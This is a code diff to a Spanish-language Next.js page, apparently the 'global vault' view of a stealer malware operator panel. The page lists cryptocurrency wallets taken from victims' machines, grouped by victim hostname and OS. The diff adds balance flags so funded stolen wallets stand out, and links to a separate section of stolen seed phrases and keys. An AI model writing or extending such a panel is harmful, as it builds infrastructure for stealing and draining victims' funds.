@@ -4,7 +4,7 @@ import Link from 'next/link';
 import { ChevronDown, ChevronRight, Search, Wallet } from 'lucide-react';
 import { useApi } from '@/hooks/useApi';
 import type { Credential, Wallet as WalletType } from '@/lib/types';
-import { ago, mask } from '@/lib/format';
+import { ago, balanceTone, mask } from '@/lib/format';
 import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
 import { Input, Select } from '@/components/ui/input';
@@ -13,7 +13,7 @@ import { Empty, ErrorState, SkeletonRows } from '@/components/ui/table';
 import { StateChip, VaultDrawer } from '@/components/vault-drawer';
 import { CredentialTable } from '@/components/credential-table';
 
-type GlobalWallet = WalletType & { victim: { id: string; hostname: string; os: string }; chain: string; secrets: number };
+type GlobalWallet = WalletType & { victim: { id: string; hostname: string; os: string }; chain: string; secrets: number; hasBalance: boolean; balanceValue: number };
 type Group = { key: string; targetId: string; chain: string; victim: { id: string; hostname: string; os: string }; wallets: GlobalWallet[]; count: number };
 type Response = { items: GlobalWallet[]; groups: Group[]; next: string | null };
 
@@ -42,7 +42,7 @@ export default function VaultPage() {
       <div className="flex items-center gap-2 pt-3">
         <div>
           <h1 className="text-lg font-semibold">Bóveda global</h1>
-          <p className="text-2xs text-muted">Material de todas las víctimas, agrupado por target.</p>
+          <p className="text-2xs text-muted">Material de todas las víctimas, agrupado por target. <Link href="/seeds" className="text-brand">Ver semillas y claves →</Link></p>
         </div>
         <div className="ml-auto flex gap-1">
           <button className="chip" data-active={mode === 'wallets'} onClick={() => setMode('wallets')}><Wallet className="h-3 w-3" /> wallets</button>
@@ -67,7 +67,7 @@ export default function VaultPage() {
           </div>
           <Card className="mt-2">
             {vault.loading && !vault.data ? <SkeletonRows rows={10} cols={5} /> : vault.error ? <ErrorState message={vault.error.message} retry={vault.refresh} /> : groups.length === 0 ? (
-              <Empty title="Sin material en la bóveda" hint="Escanear wallets desde una víctima llena esta vista." action={<Link href="/victims?has=wallets"><Button size="sm">Ir a Equipos</Button></Link>} />
+              <Empty title="Sin material en la bóveda" hint="Escanear wallets desde una víctima llena esta vista. Las semillas y claves tienen su propia sección." action={<Link href="/victims?has=wallets"><Button size="sm">Ir a Equipos</Button></Link>} />
             ) : (
               <div className="scroll-panel h-[620px]" onScroll={(event) => setScroll(event.currentTarget.scrollTop)}>
                 <div style={{ height: start * ROW }} />
@@ -81,7 +81,7 @@ export default function VaultPage() {
                         <Badge>{group.chain}</Badge>
                         <StateChip state={group.wallets[0]?.state ?? 'found'} />
                         {group.wallets[0]?.address ? <span className="font-mono text-2xs text-muted">{mask(group.wallets[0].address, 10)}</span> : null}
-                        {group.wallets.some((wallet) => wallet.balance && wallet.balance !== '0') ? <span className="num text-2xs text-warn">{group.wallets.find((wallet) => wallet.balance)?.balance}</span> : null}
+                        {group.wallets.some((wallet) => wallet.hasBalance) ? <span className="num text-2xs text-warn">{group.wallets.find((wallet) => wallet.hasBalance)?.balance}</span> : group.wallets[0]?.balance ? <span className={balanceTone(group.wallets[0].balanceValue)}>{group.wallets[0].balance}</span> : null}
                         <span className="ml-auto flex items-center gap-2 text-2xs text-muted">
                           <Link href={`/victims?select=${group.victim.id}&tab=boveda`} className="text-brand" onClick={(event) => event.stopPropagation()}>{group.victim.hostname}</Link>
                           {group.count} perfiles · {ago(group.wallets[0]?.lastSeenAt)}
